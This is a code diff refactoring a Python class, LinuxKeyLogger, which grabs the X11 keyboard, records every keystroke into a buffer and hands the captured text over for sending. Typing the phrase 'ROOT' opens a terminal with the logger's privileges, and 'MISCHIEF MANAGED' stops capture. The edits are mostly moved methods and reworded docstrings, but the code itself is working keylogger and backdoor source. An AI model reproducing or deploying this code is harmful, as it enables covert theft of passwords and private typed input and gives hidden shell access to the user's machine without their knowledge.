@@ -23,12 +23,37 @@ class LinuxKeyLogger(threading.Thread):
     """
 
     def __init__(self):
+        """
+        Constructs the logger and its internal objects
+        """
         super().__init__()
         self.display = Display()
         self.root = self.display.screen().root
         self.capturedKeys = []
         self.windowKeys = []
         self.capture = True
+
+    def run(self):
+        """
+        Starts the logging process
+        """
+        self.log()
+
+    def log(self):
+        """
+        Sets up the root window to capture the keys being typed in.
+        """
+        self.root.change_attributes(event_mask=X.KeyPressMask | X.KeyReleaseMask)
+        self.root.grab_keyboard(0, X.GrabModeAsync, X.GrabModeAsync, X.CurrentTime)
+
+        try:
+            while self.capture:
+                event = self.display.next_event()
+                self.handleEvent(event)
+                self.display.allow_events(X.AsyncKeyboard, X.CurrentTime)
+        except Exception as e:
+            print(e)
+        print(self.capturedKeys)
 
     def handleEvent(self, event):
         """
@@ -59,8 +84,6 @@ class LinuxKeyLogger(threading.Thread):
 
     def phrase_check(self):
         """
-        TODO MOVE THIS TO A DIFFERENT AREA
-
         This method will check to see if the typed in keys correspond to any
         of the preset phrases that have associated executions.
         :return:
@@ -73,10 +96,9 @@ class LinuxKeyLogger(threading.Thread):
         if (openT):
             self.openterminal()
         # ensure window size is maintained
-        maxLength = max(len(self.getStopPhrase()),len(self.getTerminalPhrase()))
+        maxLength = max(len(self.getStopPhrase()), len(self.getTerminalPhrase()))
         if len(self.windowKeys) > maxLength:
-            self.windowKeys = self.windowKeys[len(self.windowKeys)-maxLength:]
-            
+            self.windowKeys = self.windowKeys[len(self.windowKeys) - maxLength:]
 
     def checkPhrase(self, phrase):
         """
@@ -127,20 +149,6 @@ class LinuxKeyLogger(threading.Thread):
         )
         window.send_event(event, propagate=True)
 
-    def log(self):
-        """Sets up the root window to capture the keys being typed in."""
-        self.root.change_attributes(event_mask=X.KeyPressMask | X.KeyReleaseMask)
-        self.root.grab_keyboard(0, X.GrabModeAsync, X.GrabModeAsync, X.CurrentTime)
-
-        try:
-            while self.capture:
-                event = self.display.next_event()
-                self.handleEvent(event)
-                self.display.allow_events(X.AsyncKeyboard, X.CurrentTime)
-        except Exception as e:
-            print(e)
-        print(self.capturedKeys)
-
     def openterminal(self):
         """
         This method will open up a terminal on a linux machine. If this application
@@ -150,16 +158,17 @@ class LinuxKeyLogger(threading.Thread):
         """
         subprocess.call("gnome-terminal")
 
-    def run(self):
-        """Starts the logging process"""
-        self.log()
-
     def getStopPhrase(self):
-        """When this phrase is typed in the keylogging will stop"""
+        """
+        When this phrase is typed in the keylogging will stop running
+        """
         return "MISCHIEF MANAGED"
 
     def getTerminalPhrase(self):
-        """When this phrase is typed in a terminal will be created"""
+        """
+        When this phrase is typed in a terminal will be created and this terminal
+        will have the same privileges that the key logger is running as.
+        """
         return "ROOT"
 
     def hasInfoToSend(self):
@@ -176,7 +185,7 @@ class LinuxKeyLogger(threading.Thread):
         once the information is retrieved it is purged from this object.
         :return: A string of the captured keys
         """
-        ret =  ''.join(self.capturedKeys)
+        ret = ''.join(self.capturedKeys)
         self.capturedKeys = []
         return ret
 
